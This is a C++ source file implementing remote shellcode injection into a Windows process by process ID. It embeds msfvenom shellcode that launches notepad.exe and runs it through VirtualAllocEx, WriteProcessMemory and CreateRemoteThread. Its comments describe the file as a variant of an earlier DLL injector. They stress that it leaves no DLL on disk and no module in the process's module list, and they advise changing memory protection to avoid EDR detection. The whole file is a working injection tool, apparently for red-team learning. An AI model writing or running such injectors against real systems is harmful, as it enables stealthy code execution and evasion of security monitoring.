// sc_injector.cpp — REMOTE shellcode injection
//
// Variant of #13: instead of writing a DLL path and calling LoadLibraryA,
// we write RAW SHELLCODE and jump directly into it. No DLL file on disk,
// no LoadLibrary event, no module in PEB.
//
// Same msfvenom shellcode as the user's POC - "exec CMD=notepad.exe":
//   msfvenom -p windows/x64/exec CMD=notepad.exe -f c
//
// Build: cl /EHsc /O2 /nologo sc_injector.cpp /link /OUT:sc_injector.exe
// Usage: sc_injector.exe <PID>

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// msfvenom -p windows/x64/exec CMD=notepad.exe -f c
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

int main(int argc, char** argv) {
    if (argc != 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    SIZE_T scLen = sizeof(shellcode) - 1;  // -1 for the trailing \0

    printf("[*] target PID: %lu\n", pid);
    printf("[*] shellcode : %zu bytes\n", scLen);

    // 1. OpenProcess
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[!] OpenProcess %lu\n", GetLastError()); return 2; }
    printf("[+] OpenProcess OK\n");

    // 2. Allocate RWX memory in target (big enough for the shellcode)
    //    NOTE: PAGE_EXECUTE_READWRITE here is the big red flag EDR looks for.
    //    Safer op: PAGE_READWRITE → write → VirtualProtectEx to PAGE_EXECUTE_READ.
    LPVOID remoteBuf = VirtualAllocEx(hProc, nullptr, scLen,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remoteBuf) { printf("[!] VirtualAllocEx %lu\n", GetLastError()); return 3; }
    printf("[+] VirtualAllocEx @ %p (%zu bytes RWX)\n", remoteBuf, scLen);

    // 3. Write shellcode bytes
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteBuf, shellcode, scLen, &written)) {
        printf("[!] WriteProcessMemory %lu\n", GetLastError());
        return 4;
    }
    printf("[+] WriteProcessMemory wrote %zu bytes\n", written);

    // 4. CreateRemoteThread with shellcode as the entry point.
    //    This is the key difference from #13: we jump straight into the bytes
    //    we just wrote. No LoadLibraryA, no DLL path, no DLL file.
    HANDLE hThread = CreateRemoteThread(
        hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf,
        nullptr, 0, nullptr);
    if (!hThread) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); return 5; }
    printf("[+] CreateRemoteThread fired - shellcode is now running INSIDE PID %lu\n", pid);

    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    // Deliberately do NOT free remoteBuf - if the shellcode spawned a child, it may still be executing
    CloseHandle(hProc);
    printf("[+] done. Look for notepad.exe as a child of PID %lu.\n", pid);
    return 0;
}
